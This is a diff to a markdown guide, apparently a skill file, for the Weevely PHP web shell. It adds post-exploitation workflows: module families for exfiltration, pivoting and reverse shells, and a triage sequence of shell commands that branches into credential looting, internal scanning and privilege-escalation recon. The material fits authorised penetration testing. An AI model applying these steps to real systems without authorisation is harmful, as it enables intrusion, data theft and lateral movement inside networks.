@@ -40,6 +40,14 @@ python3 weevely.py http://target.com/uploads/shell.php MyPassword
 | `:audit_phpconf` | Audit PHP config |
 | `:bruteforce_sql` | SQL brute-force |
 
+## High-value Module Families
+
+- `:system_*` for host context and process visibility
+- `:file_*` for file enumeration, read/write, exfiltration
+- `:audit_*` for privilege-escalation and security posture checks
+- `:net_*` for internal scanning and proxy pivoting
+- `:backdoor_*` for reverse/direct shell pivots
+
 ## Common Workflows
 
 **Full post-ex after upload:**
@@ -56,8 +64,22 @@ python3 weevely.py http://target.com/uploads/shell.php MyPassword
 # Configure proxychains → proxychains nmap internal_host
 ```
 
+## Post-Upload Triage Flow
+
+```text
+:system_info
+:shell_sh "id && uname -a && pwd"
+:audit_phpconf
+:file_ls .
+```
+
+Then choose one branch:
+- Credential/file branch (`:file_find`, `:file_read`, `:file_download`)
+- Network branch (`:net_ifconfig`, `:net_scan`, `:net_proxy`)
+- Priv-esc recon branch (`:audit_suidsgid`, `:audit_filesystem`)
+
 ## Resources
 
 | File | When to load |
 |------|--------------|
-| `references/` | Module list and evasion options |
+| `references/module-playbooks.md` | Practical module chains for triage, file loot, pivoting, and privilege-escalation reconnaissance |
